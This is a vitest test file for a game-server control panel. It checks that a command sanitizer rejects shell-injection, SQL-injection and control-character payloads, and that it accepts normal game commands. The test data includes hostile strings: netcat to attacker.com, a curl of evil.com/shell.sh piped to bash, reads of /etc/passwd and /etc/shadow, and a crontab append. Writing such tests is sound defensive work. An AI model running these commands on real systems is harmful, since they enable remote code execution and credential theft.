import { describe, it, expect } from 'vitest';
import { MAX_COMMAND_LENGTH, COMMAND_CHAR_ALLOWLIST } from '@hytale-panel/shared';

/**
 * Command Injection Prevention Tests
 * Tests that shell metacharacters, chained commands, and injection
 * payloads are rejected by the command sanitization layer.
 */

function sanitizeCommand(command: string): string {
  const trimmed = command.trim();
  if (trimmed.length === 0) throw new Error('Command cannot be empty');
  if (trimmed.length > MAX_COMMAND_LENGTH) throw new Error(`Command exceeds maximum length of ${MAX_COMMAND_LENGTH}`);
  if (!COMMAND_CHAR_ALLOWLIST.test(trimmed)) throw new Error('Command contains disallowed characters');
  return trimmed;
}

describe('Command Injection — Shell Metacharacters', () => {
  const shellMetachars = [
    { char: ';', desc: 'semicolon (command separator)', payload: 'save; cat /etc/passwd' },
    { char: '|', desc: 'pipe', payload: 'save | nc attacker.com 4444' },
    { char: '&&', desc: 'AND operator', payload: 'save && curl evil.com/shell.sh | bash' },
    { char: '||', desc: 'OR operator', payload: 'false || cat /etc/shadow' },
    { char: '$()', desc: 'command substitution', payload: 'save $(whoami)' },
    { char: '``', desc: 'backtick substitution', payload: 'save `id`' },
    { char: '>', desc: 'output redirect', payload: 'save > /tmp/pwned' },
    { char: '<', desc: 'input redirect', payload: 'save < /etc/passwd' },
    { char: '>>', desc: 'append redirect', payload: 'save >> /etc/crontab' },
    { char: '&', desc: 'background operator', payload: 'save & curl evil.com' },
    { char: '\\n', desc: 'newline injection', payload: 'save\ncat /etc/passwd' },
    { char: '\\r', desc: 'carriage return injection', payload: 'save\rcat /etc/passwd' },
    { char: "'", desc: 'single quote', payload: "save' OR '1'='1" },
    { char: '"', desc: 'double quote', payload: 'save"$(whoami)"' },
    { char: '!', desc: 'history expansion', payload: 'save !!' },
    { char: '#', desc: 'comment', payload: 'save # comment' },
    { char: '~', desc: 'home directory', payload: '~/evil.sh' },
    { char: '*', desc: 'glob wildcard', payload: 'rm *' },
    { char: '?', desc: 'glob single char', payload: 'cat /etc/passw?' },
    { char: '[', desc: 'glob range', payload: 'cat /etc/[ps]*' },
    { char: '{', desc: 'brace expansion', payload: 'cat /etc/{passwd,shadow}' },
    { char: '\\', desc: 'backslash escape', payload: 'cat /etc/pa\\sswd' },
  ];

  for (const { char, desc, payload } of shellMetachars) {
    it(`should reject ${desc} (${char})`, () => {
      expect(() => sanitizeCommand(payload)).toThrow('disallowed characters');
    });
  }
});

describe('Command Injection — SQL Injection Attempts', () => {
  it('should reject SQL injection payloads', () => {
    expect(() => sanitizeCommand("' OR 1=1 --")).toThrow('disallowed characters');
    expect(() => sanitizeCommand('" OR ""="')).toThrow('disallowed characters');
    expect(() => sanitizeCommand("'; DROP TABLE users; --")).toThrow('disallowed characters');
  });
});

describe('Command Injection — Encoding Bypass Attempts', () => {
  it('should reject null byte injection', () => {
    expect(() => sanitizeCommand('save\x00cat /etc/passwd')).toThrow('disallowed characters');
  });

  it('should reject tab injection', () => {
    expect(() => sanitizeCommand('save\tcat /etc/passwd')).toThrow('disallowed characters');
  });

  it('should reject vertical tab', () => {
    expect(() => sanitizeCommand('save\x0Bcat')).toThrow('disallowed characters');
  });

  it('should reject form feed', () => {
    expect(() => sanitizeCommand('save\x0Ccat')).toThrow('disallowed characters');
  });
});

describe('Command Injection — Length Boundary', () => {
  it('should accept command at exactly max length', () => {
    const cmd = 'a'.repeat(MAX_COMMAND_LENGTH);
    expect(sanitizeCommand(cmd)).toBe(cmd);
  });

  it('should reject command exceeding max length by 1', () => {
    expect(() => sanitizeCommand('a'.repeat(MAX_COMMAND_LENGTH + 1))).toThrow('exceeds maximum length');
  });
});

describe('Command Injection — Valid Game Commands', () => {
  const validCommands = [
    'save',
    'stop',
    'whitelist add Player1',
    'whitelist remove TestUser_123',
    'ban Player2',
    'kick Player3',
    'say Hello world',
    'tp Player1 0 64 0',
    'gamemode creative Player1',
    'time set day',
    'weather clear',
    'difficulty normal',
  ];

  for (const cmd of validCommands) {
    it(`should accept valid game command: "${cmd}"`, () => {
      expect(sanitizeCommand(cmd)).toBe(cmd);
    });
  }
});

describe('Command Injection — execFile Safety', () => {
  // The helper uses execFile (not exec) which does NOT invoke a shell.
  // Even if a command passes character validation, it's sent via tmux send-keys,
  // not executed as a shell command.
  it('should document that execFile prevents shell interpretation', () => {
    // execFile('/usr/bin/tmux', ['send-keys', '-t', session, command, 'Enter'])
    // The command string is passed as a single argument to tmux send-keys,
    // not interpreted by a shell. Shell metacharacters have no special meaning.
    const args = ['send-keys', '-t', 'hytale', 'save', 'Enter'];
    expect(args).toHaveLength(5);
    // Each arg is passed directly to the process — no shell expansion
  });
});